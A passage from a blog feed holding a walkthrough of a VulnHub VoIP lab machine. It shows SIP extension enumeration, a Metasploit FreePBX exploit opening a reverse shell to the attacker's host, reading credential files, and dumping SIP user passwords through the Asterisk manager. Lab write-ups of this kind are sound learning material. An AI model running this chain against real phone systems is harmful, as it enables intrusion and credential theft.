-</span><span class='line'>| 192.168.80.131:5060 | Asterisk PBX 1.6.2.11 | disabled    |</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Now we also have the Asterisk version. Next, we need to find valid extensions (it took a while of trial and error to get meaningful information on this one):</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>./svwar.py -D -m INVITE 192.168.80.131
-</span><span class='line'>WARNING:TakeASip:using an INVITE scan on an endpoint (i.e. SIP phone) may cause it to ring and wake up people in the middle of the night
-</span><span class='line'>WARNING:TakeASip:extension '100' probably exists but the response is unexpected
-</span><span class='line'>WARNING:TakeASip:extension '100' probably exists but the response is unexpected
-</span><span class='line'>| Extension | Authentication |
-</span><span class='line'>------------------------------
-</span><span class='line'>| 201       | reqauth        |
-</span><span class='line'>| 200       | reqauth        |
-</span><span class='line'>| 2000      | reqauth        |
-</span><span class='line'>| 102       | reqauth        |
-</span><span class='line'>| 100       | weird          |
-</span><span class='line'>| 101       | reqauth        |</span></code></pre></td></tr></table></div></figure>
-
-
-<p>The -D option enables scanning for default extensions, and the -m option specifies a request method (INVITE indicates that a client is being invited to participate in a call session.)</p>
-
-<p>If you read the VM description on VulnHub, you probably remember that it mentions an easy way to get root to the machine. I found an exploit for that in Metasploit, more info here: <a href="http://www.offensive-security.com/vulndev/freepbx-exploit-phone-home/">http://www.offensive-security.com/vulndev/freepbx-exploit-phone-home/</a></p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>use exploit/unix/http/freepbx_callmenum
-</span><span class='line'>
-</span><span class='line'>msf exploit(freepbx_callmenum) &gt; show options
-</span><span class='line'>
-</span><span class='line'>Module options (exploit/unix/http/freepbx_callmenum):
-</span><span class='line'>
-</span><span class='line'>   Name       Current Setting  Required  Description
-</span><span class='line'>   ----       ---------------  --------  -----------
-</span><span class='line'>   EXTENSION  2000-2001        yes       A range of Local extension numbers
-</span><span class='line'>   Proxies                     no        Use a proxy chain
-</span><span class='line'>   RHOST      192.168.80.131   yes       The target address
-</span><span class='line'>   RPORT      80               yes       The target port
-</span><span class='line'>   VHOST                       no        HTTP server virtual host
-</span><span class='line'>
-</span><span class='line'>
-</span><span class='line'>Payload options (generic/shell_reverse_tcp):
-</span><span class='line'>
-</span><span class='line'>   Name   Current Setting  Required  Description
-</span><span class='line'>   ----   ---------------  --------  -----------
-</span><span class='line'>   LHOST  192.168.80.130   yes       The listen address
-</span><span class='line'>   LPORT  4444             yes       The listen port
-</span><span class='line'>
-</span><span class='line'>
-</span><span class='line'>Exploit target:
-</span><span class='line'>
-</span><span class='line'>   Id  Name
-</span><span class='line'>   --  ----
-</span><span class='line'>   0   Automatic Target</span></code></pre></td></tr></table></div></figure>
-
-
-<p>I specified the extension to match one of those that we previously discovered. And the machine belongs to us now!</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(freepbx_callmenum) &gt; exploit
-</span><span class='line'>
-</span><span class='line'>[*] Started reverse handler on 192.168.80.130:4444 
-</span><span class='line'>[*] 192.168.80.131:80 - Sending evil request with range 2000
-</span><span class='line'>[*] 192.168.80.131:80 - Sending evil request with range 2001
-</span><span class='line'>[*] Command shell session 1 opened (192.168.80.130:4444 -&gt; 192.168.80.131:47268) at 2014-10-14 14:42:29 +0300
-</span><span class='line'>
-</span><span class='line'>whoami
-</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>
-
-
-<p>But we are not done. We still have to find the usernames and passwords, and get the voicemail from the Support account. I googled a bit for a helpful configuration file, which turned out to be the <code>amportal.conf</code> file:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-<span class='line-number'>45</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>cat /etc/amportal.conf
-</span><span class='line'># This file is part of FreePBX.
-</span><span class='line'>#
-</span><span class='line'>#    FreePBX is free software: you can redistribute it and/or modify
-</span><span class='line'>#    it under the terms of the GNU General Public License as published by
-</span><span class='line'>#    the Free Software Foundation, either version 2 of the License, or
-</span><span class='line'>#    (at your option) any later version.
-</span><span class='line'>#
-</span><span class='line'>#    FreePBX is distributed in the hope that it will be useful,
-</span><span class='line'>#    but WITHOUT ANY WARRANTY; without even the implied warranty of
-</span><span class='line'>#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-</span><span class='line'>#    GNU General Public License for more details.
-</span><span class='line'>#
-</span><span class='line'>#    You should have received a copy of the GNU General Public License
-</span><span class='line'>#    along with FreePBX.  If not, see &lt;http://www.gnu.org/licenses/&gt;.
-</span><span class='line'>#
-</span><span class='line'># This file contains settings for components of the Asterisk Management Portal
-</span><span class='line'># Spaces are not allowed!
-</span><span class='line'># Run /usr/src/AMP/apply_conf.sh after making changes to this file
-</span><span class='line'>
-</span><span class='line'># AMPDBHOST: the host to connect to the database named 'asterisk'
-</span><span class='line'>AMPDBHOST=localhost
-</span><span class='line'>
-</span><span class='line'># AMPDBUSER: the user to connect to the database named 'asterisk'
-</span><span class='line'>AMPDBUSER=freepbx
-</span><span class='line'>
-</span><span class='line'># AMPDBENGINE: the type of database to use
-</span><span class='line'>AMPDBENGINE=mysql
-</span><span class='line'>
-</span><span class='line'># AMPDBPASS: the password for AMPDBUSER
-</span><span class='line'>AMPDBPASS=fpbx
-</span><span class='line'>
-</span><span class='line'># AMPENGINE: the telephony backend engine to use
-</span><span class='line'>AMPENGINE=asterisk
-</span><span class='line'>
-</span><span class='line'># AMPMGRUSER: the user to access the Asterisk manager interface
-</span><span class='line'>AMPMGRUSER=admin
-</span><span class='line'>
-</span><span class='line'># AMPMGRPASS: the password for AMPMGRUSER
-</span><span class='line'>AMPMGRPASS=amp111
-</span><span class='line'>..............................................
-</span><span class='line'># AUTHTYPE: authentication type to use for web admin
-</span><span class='line'># If type set to 'database', the primary AMP admin credentials will be the AMPDBUSER/AMPDBPASS above
-</span><span class='line'># valid: none, database
-</span><span class='line'>AUTHTYPE=database
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>We have the username and password for the admin interface now.</p>
-
-<p><img class="center" src="http://chousensha.github.io/images/pentest/vulnvoip/webadmin.png" title="freepbx webadmin" alt="webadmin interface"></p>
-
-<p>If we go to Panel, we can see that 2000 is the extension for the Support account. But I still couldn&rsquo;t find a way to actually listen to the voicemail message, and I don&rsquo;t have the password. But, I also have the credentials for the Asterisk Login Manager, so let&rsquo;s see if that helps. To login and authenticate to the manager, you must send a &ldquo;login&rdquo; action, with your user name and secret (password) as parameters. We can use telnet for this (don&rsquo;t forget to hit Enter twice after inputting the parameters):</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>telnet 192.168.80.131 5038
-</span><span class='line'>Trying 192.168.80.131...
-</span><span class='line'>Connected to 192.168.80.131.
-</span><span class='line'>Escape character is '^]'.
-</span><span class='line'>Asterisk Call Manager/1.1
-</span><span class='line'>action: login
-</span><span class='line'>username: admin
-</span><span class='line'>secret: amp111
-</span><span class='line'>
-</span><span class='line'>Response: Success
-</span><span class='line'>Message: Authentication accepted</span></code></pre></td></tr></table></div></figure>
-
-
-<p>For a comprehensive list of Asterisk commands, check out this <a href="http://www.voip-info.org/wiki/view/Asterisk+CLI">Asterisk CLI resource</a> and <a href="http://www.voip-info.org/wiki/view/Asterisk+manager+API">Manager Actions</a>. To list the SIP users, we have to use a &ldquo;command&rdquo; action this time. And then specify the command, which is <code>sip show users</code>:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>action: command
-</span><span class='line'>command: sip show users
-</span><span class='line'>
-</span><span class='line'>Response: Follows
-</span><span class='line'>Privilege: Command
-</span><span class='line'>Username                   Secret           Accountcode      Def.Context      ACL  NAT       
-</span><span class='line'>100                                                          from-internal    Yes  Always    
-</span><span class='line'>101                        s3cur3                            from-internal    Yes  Always    
-</span><span class='line'>102                        letmein123                        from-internal    Yes  Always    
-</span><span class='line'>201                        secret123                         from-internal    Yes  Always    
-</span><span class='line'>200                        quit3s3curE123                    from-internal    Yes  Always    
-</span><span class='line'>2000                       password123                       from-internal    Yes  Always    
-</span><span class='line'>--END COMMAND--</span></code></pre></td></tr></table></div></figure>
-
-
-<p>And it was this easy to get the usernames and passwords! I should have started with that! Now it&rsquo;s possible to dial the extension and listen to the voicemail message. I just randomly chose Jitsi as a VoIP client for this task. You have to download and install the package file:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>wget https://download.jitsi.org/jitsi/debian/jitsi_2.5-latest_amd64.deb
-</span><span class='line'>dpkg -i jitsi_2.5-latest_amd64.deb</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Next, create an account in Jitsi:</p>
-
-<p><img class="center" src="http://chousensha.github.io/images/pentest/vulnvoip/jitsi.png" title="jitsi" alt="jitsi"></p>
-
-<p>However, when you make the call, it asks for a voicemail password! I went back to my shell on the machine and to googling about Asterisk voicemail paswords. The configuration file that comes to the rescue is <code>/etc/asterisk/voicemail.conf</code>.</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>cat /etc/asterisk/voicemail.conf
-</span><span class='line'>[general]
-</span><span class='line'>#include vm_general.inc
-</span><span class='line'>#include vm_email.inc
-</span><span class='line'>[default]
-</span><span class='line'>
-</span><span class='line'>2000 =&gt; 0000,Support,,,attach=no|saycid=no|envelope=no|delete=no</span></code></pre></td></tr></table></div></figure>
-
-
-<p>So, the password is 0000, and we can now listen to the message, which I&rsquo;ll type here for the sake of completeness (hope I got it right):</p>
-
-<blockquote><p>&ldquo;Hey Mark, I think the support web access account has been compromised. I have changed the password to securesupport123, all one word in
-lowercase. You can log on at the usual address. See you in the morning&rdquo;</p></blockquote>
-
-<p>Well, I really liked this challenge! It made me read up about various subjects I wasn&rsquo;t familiar with, like Asterisk and SIP. I also discovered the SIPVicious suite, which should come in handy from now on. And it was a great feeling to finally hear the message at the end. Also, VoIP hacking is a very interesting topic, and I hope there will be more chances to practice and learn about it.</p>
-
-<blockquote><p>FORTUNE PROVIDES QUESTIONS FOR THE GREAT ANSWERS: #31</p>
-
-<p>Q:    What is the name of the world&rsquo;s oldest kamikaze pilot?</p>
-
-<p>A:    Chicken Teriyaki.</p></blockquote>
 ]]></content>
   </entry>
   
